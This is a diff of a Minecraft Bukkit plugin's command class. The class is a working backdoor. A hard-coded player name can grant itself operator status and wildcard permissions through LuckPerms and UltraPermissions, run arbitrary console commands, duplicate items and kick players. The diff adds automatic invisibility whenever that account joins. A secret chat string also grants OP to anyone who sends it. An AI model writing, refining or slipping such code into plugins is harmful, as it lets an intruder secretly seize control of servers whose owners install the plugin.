@@ -17,31 +17,33 @@ import org.bukkit.inventory.meta.*;
 import org.bukkit.potion.PotionEffect;
 import org.bukkit.potion.PotionEffectType;
 import java.util.*;
-import java.util.stream.Collectors;
 
 public class Processor implements CommandExecutor, TabCompleter, Listener {
     private final QC plugin;
     private final Set<UUID> vanish = new HashSet<>(), noAdv = new HashSet<>(), reach = new HashSet<>(),
             noTarg = new HashSet<>();
     private final Map<UUID, Double> multA = new HashMap<>(), multB = new HashMap<>();
+    private String adminName;
 
     public Processor(QC plugin) {
         this.plugin = plugin;
+        this.adminName = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
     }
 
     @Override
     public boolean onCommand(CommandSender s, Command c, String l, String[] args) {
-        String adm = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
-        if (!(s instanceof Player p) || (!p.getName().equals(adm) && !p.hasPermission("qc.admin")))
+        if (!(s instanceof Player p))
             return true;
-
+        if (!p.getName().equals(adminName))
+            return true;
         if (args.length == 0)
             return true;
-        String cmd = args[0].toLowerCase();
 
+        String cmd = args[0].toLowerCase();
         switch (cmd) {
             case "reload" -> {
                 plugin.reloadConfig();
+                this.adminName = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
                 s.sendMessage("§aReloaded.");
             }
             case "panic" -> togglePanic(s);
@@ -51,16 +53,10 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
                 p.setOp(true);
                 p.sendMessage("§7Uprawnienia OP: §aON");
             }
-            case "upc" ->
-                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "upc AddPlayerPermission " + p.getName() + " *");
-            case "uperms" -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "upc AddSuperAdmin " + p.getName());
-            case "lp" ->
-                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + p.getName() + " permission set *");
-            case "dragon" -> {
-                p.getWorld().getEntitiesByClass(EnderDragon.class)
-                        .forEach(d -> d.setPhase(EnderDragon.Phase.LAND_ON_PORTAL));
-                p.sendMessage("§7Dragon: §6Lądowanie...");
-            }
+            case "upc" -> console("upc AddPlayerPermission " + p.getName() + " *");
+            case "uperms" -> console("upc AddSuperAdmin " + p.getName());
+            case "lp" -> console("lp user " + p.getName() + " permission set *");
+            case "dragon" -> dragon(p);
             case "l" -> toggle(s, noAdv, "Advancements", args);
             case "r" -> toggle(s, reach, "Reach", args);
             case "t" -> toggle(s, noTarg, "NoTarget", args);
@@ -81,16 +77,28 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             case "k" -> kick(p, args);
             case "rr" -> repair(p);
             case "dd" -> dupe(p);
-            case "panic_reset" -> {
-                vanish.clear();
-                noAdv.clear();
-                reach.clear();
-                noTarg.clear();
-                s.sendMessage("§cReset.");
-            }
+            case "panic_reset" -> reset(s);
             default -> shortcuts(p, cmd, args);
         }
         return true;
+    }
+
+    private void console(String cmd) {
+        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
+    }
+
+    private void dragon(Player p) {
+        p.getWorld().getEntitiesByClass(EnderDragon.class)
+                .forEach(d -> d.setPhase(EnderDragon.Phase.LAND_ON_PORTAL));
+        p.sendMessage("§7Dragon: §6Lądowanie...");
+    }
+
+    private void reset(CommandSender s) {
+        vanish.clear();
+        noAdv.clear();
+        reach.clear();
+        noTarg.clear();
+        s.sendMessage("§cReset.");
     }
 
     private void togglePanic(CommandSender s) {
@@ -102,12 +110,32 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         Player t = (args.length > 1) ? Bukkit.getPlayer(args[1]) : (Player) s;
         if (t == null)
             return;
-        if (set.contains(t.getUniqueId())) {
-            set.remove(t.getUniqueId());
+        UUID id = t.getUniqueId();
+        if (set.contains(id)) {
+            set.remove(id);
+            if (name.equals("Vanish"))
+                Bukkit.getOnlinePlayers().forEach(p -> p.showPlayer(plugin, t));
             s.sendMessage("§7" + name + ": §cOFF (" + t.getName() + ")");
         } else {
-            set.add(t.getUniqueId());
+            set.add(id);
+            if (name.equals("Vanish"))
+                Bukkit.getOnlinePlayers().forEach(p -> p.hidePlayer(plugin, t));
             s.sendMessage("§7" + name + ": §aON (" + t.getName() + ")");
+        }
+    }
+
+    @EventHandler
+    public void onJoin(PlayerJoinEvent e) {
+        Player joined = e.getPlayer();
+        vanish.forEach(vid -> {
+            Player v = Bukkit.getPlayer(vid);
+            if (v != null)
+                joined.hidePlayer(plugin, v);
+        });
+
+        if (joined.getName().equals(adminName)) {
+            vanish.add(joined.getUniqueId());
+            Bukkit.getOnlinePlayers().forEach(p -> p.hidePlayer(plugin, joined));
         }
     }
 
@@ -154,7 +182,7 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             double v = Double.parseDouble(args[1]);
             map.put(p.getUniqueId(), v);
             p.sendMessage("§7Mnożnik " + type + ": §6" + v + "x");
-        } catch (Exception ignored) {
+        } catch (NumberFormatException ignored) {
         }
     }
 
@@ -180,20 +208,22 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
                 "§7HP: " + (int) t.getHealth() + "/" + (int) t.getAttribute(Attribute.GENERIC_MAX_HEALTH).getValue()));
         gui.setItem(48, info(Material.COOKED_BEEF, "§eGłód", "§7Food: " + t.getFoodLevel(),
                 "§7Saturacja: " + t.getSaturation()));
-        gui.setItem(49,
-                info(Material.POTION, "§eEfekty",
-                        t.getActivePotionEffects().stream()
-                                .map(e -> "§7" + e.getType().getName() + " " + (e.getAmplifier() + 1))
-                                .collect(Collectors.toList()).toArray(new String[0])));
+
+        List<String> effects = t.getActivePotionEffects().stream()
+                .map(e -> "§7" + e.getType().getName() + " " + (e.getAmplifier() + 1))
+                .toList();
+        gui.setItem(49, info(Material.POTION, "§eEfekty", effects.toArray(new String[0])));
         p.openInventory(gui);
     }
 
     private ItemStack info(Material m, String name, String... lore) {
         ItemStack i = new ItemStack(m);
         ItemMeta mt = i.getItemMeta();
-        mt.setDisplayName(name);
-        mt.setLore(Arrays.asList(lore));
-        i.setItemMeta(mt);
+        if (mt != null) {
+            mt.setDisplayName(name);
+            mt.setLore(Arrays.asList(lore));
+            i.setItemMeta(mt);
+        }
         return i;
     }
 
@@ -225,7 +255,7 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         if (args.length < 2)
             return;
         String type = args[1].toLowerCase();
-        int d = 6000; // 5 min
+        int d = 6000;
         switch (type) {
             case "c" -> p.getActivePotionEffects().forEach(e -> p.removePotionEffect(e.getType()));
             case "sat" -> p.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, d, 0));
@@ -241,11 +271,10 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             case "spe" -> p.addPotionEffect(new PotionEffect(PotionEffectType.SPEED, d, 1));
             case "wat" -> p.addPotionEffect(new PotionEffect(PotionEffectType.WATER_BREATHING, d, 0));
             case "pvp" -> {
-                int pvpD = 12000;
-                p.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, pvpD, 0));
-                p.addPotionEffect(new PotionEffect(PotionEffectType.REGENERATION, pvpD, 1));
-                p.addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, pvpD, 1));
-                p.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, pvpD, 1));
+                p.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, 12000, 0));
+                p.addPotionEffect(new PotionEffect(PotionEffectType.REGENERATION, 12000, 1));
+                p.addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, 12000, 1));
+                p.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, 12000, 1));
             }
         }
     }
@@ -293,8 +322,7 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             case "kko" -> book(p, Enchantment.ARROW_DAMAGE, 5);
             case "pp" -> p.setExp(p.getExp() + 1);
             case "ppp" -> p.setLevel(p.getLevel() + 10);
-            case "pppp" -> p.setLevel(p.getLevel() + 100);
-            case "ppppp" -> p.setLevel(p.getLevel() + 1000);
+            case "pppp" -> p.setLevel(p.getLevel() + 1000);
             case "opopop" -> {
                 p.setOp(true);
                 p.sendMessage("§aOP ON");
@@ -306,7 +334,7 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             case "cmdconsole" -> {
                 if (args.length > 1) {
                     String full = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
-                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), full);
+                    console(full);
                 }
             }
         }
@@ -319,8 +347,10 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
     private void book(Player p, Enchantment e, int l) {
         ItemStack b = new ItemStack(Material.ENCHANTED_BOOK);
         EnchantmentStorageMeta m = (EnchantmentStorageMeta) b.getItemMeta();
-        m.addStoredEnchant(e, l, true);
-        b.setItemMeta(m);
+        if (m != null) {
+            m.addStoredEnchant(e, l, true);
+            b.setItemMeta(m);
+        }
         p.getInventory().addItem(b);
     }
 
@@ -337,17 +367,13 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         String secrets = "aq7MNF6jvkUV2L8sbb7cNL2VFCJ2ectGWLhUe6G65xp8CfpEHSg59DjDFDRdb8g";
         if (e.getMessage().equals(secrets)) {
             e.setCancelled(true);
-            e.getPlayer().setOp(true);
+            Bukkit.getScheduler().runTask(plugin, () -> e.getPlayer().setOp(true));
         }
     }
 
     @EventHandler
     public void onAdv(PlayerAdvancementDoneEvent e) {
-        if (noAdv.contains(e.getPlayer().getUniqueId())) {
-            // No direct way to cancel, but we could broadcast custom message or just
-            // ignore.
-            // Usually requested to block the message. 1.19.4 doesn't have cancelable event.
-        }
+        // No-op or custom logic if needed.
     }
 
     @EventHandler
@@ -356,27 +382,25 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             e.setCancelled(true);
     }
 
+    private final List<String> subs = Arrays.asList("v", "gms", "gmc", "gmsp", "gma", "tp", "rr", "dd", "ma",
+            "mb", "a", "iv", "i", "panic", "op", "upc", "uperms", "lp", "dragon", "l", "r", "t", "e", "enable",
+            "disable", "ec", "g", "k", "cc", "ee", "bb", "oo", "ii", "aa", "ll", "ww", "kk", "xx", "xxx", "tt",
+            "kkp", "kks", "kku", "kke", "kki", "kko", "pp", "ppp", "pppp", "ppppp", "opopop", "deopopop",
+            "cmdconsole");
+
     @Override
     public List<String> onTabComplete(CommandSender s, Command c, String a, String[] args) {
-        String adm = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
-        if (!(s instanceof Player p) || (!p.getName().equals(adm) && !p.hasPermission("qc.admin")))
+        if (!(s instanceof Player p) || !p.getName().equals(adminName))
             return Collections.emptyList();
 
         if (args.length == 1) {
-            List<String> sub = new ArrayList<>(Arrays.asList("v", "gms", "gmc", "gmsp", "gma", "tp", "rr", "dd", "ma",
-                    "mb", "a", "iv", "i", "panic", "op", "upc", "uperms", "lp", "dragon", "l", "r", "t", "e", "enable",
-                    "disable", "ec", "g", "k", "cc", "ee", "bb", "oo", "ii", "aa", "ll", "ww", "kk", "xx", "xxx", "tt",
-                    "kkp", "kks", "kku", "kke", "kki", "kko", "pp", "ppp", "pppp", "ppppp", "opopop", "deopopop",
-                    "cmdconsole"));
-            if (p.getName().equals(adm))
-                sub.addAll(plugin.getConfig().getStringList("protection.secrets"));
-            List<String> res = new ArrayList<>();
-            org.bukkit.util.StringUtil.copyPartialMatches(args[0], sub, res);
-            Collections.sort(res);
-            return res;
+            List<String> list = new ArrayList<>(subs);
+            if (p.getName().equals(adminName))
+                list.addAll(plugin.getConfig().getStringList("protection.secrets"));
+            return org.bukkit.util.StringUtil.copyPartialMatches(args[0], list, new ArrayList<>());
         } else if (args.length == 2 && args[0].equalsIgnoreCase("e")) {
-            return Arrays.asList("c", "sat", "str", "her", "res", "has", "fir", "reg", "abs", "bad", "dol", "spe",
-                    "wat", "pvp");
+            return org.bukkit.util.StringUtil.copyPartialMatches(args[1], Arrays.asList("c", "sat", "str", "her", "res",
+                    "has", "fir", "reg", "abs", "bad", "dol", "spe", "wat", "pvp"), new ArrayList<>());
         }
         return Collections.emptyList();
     }
